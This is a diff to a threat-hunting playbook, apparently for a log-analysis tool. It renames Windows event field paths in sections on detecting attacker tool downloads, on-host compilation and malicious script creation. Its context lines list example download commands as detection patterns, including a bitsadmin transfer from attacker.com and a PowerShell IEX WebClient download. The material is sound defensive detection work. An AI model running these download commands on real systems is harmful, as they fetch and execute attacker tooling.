@@ -17,14 +17,14 @@ playbook: |
        - `bitsadmin.exe /transfer job http://attacker.com/tool.exe`
        - `powershell.exe -c IEX(New-Object Net.WebClient).DownloadFile()`
        - `wget`, `curl` (if installed)
-     - Fields: EventData.CommandLine, EventData.DestinationIp
+     - Fields: event_data.CommandLine, event_data.DestinationIp
      - Query: `search_events_by_content` for download commands
      - Red flags: Downloads from suspicious domains, tool repositories
   
   2. **Attack Tool Compilation (Event ID 4688, Sysmon 1)**
      - Compiling custom tools on compromised systems
      - Processes: csc.exe (C# compiler), cl.exe (C++ compiler), msbuild.exe
-     - Fields: EventData.NewProcessName, EventData.CommandLine
+     - Fields: event_data.NewProcessName, event_data.CommandLine
      - Query: `search_events_by_content` for 'csc.exe', 'msbuild.exe'
      - Red flags: Compilation of suspicious code, obfuscation tools
   
@@ -40,7 +40,7 @@ playbook: |
   4. **Script/Payload Creation (Sysmon 11)**
      - Creating malicious scripts on disk
      - File types: .ps1, .bat, .vbs, .hta, .js
-     - Fields: EventData.TargetFilename
+     - Fields: event_data.TargetFilename
      - Query: `search_events_by_content` for script extensions in unusual locations
      - Red flags: Scripts in Temp, AppData, ProgramData
   
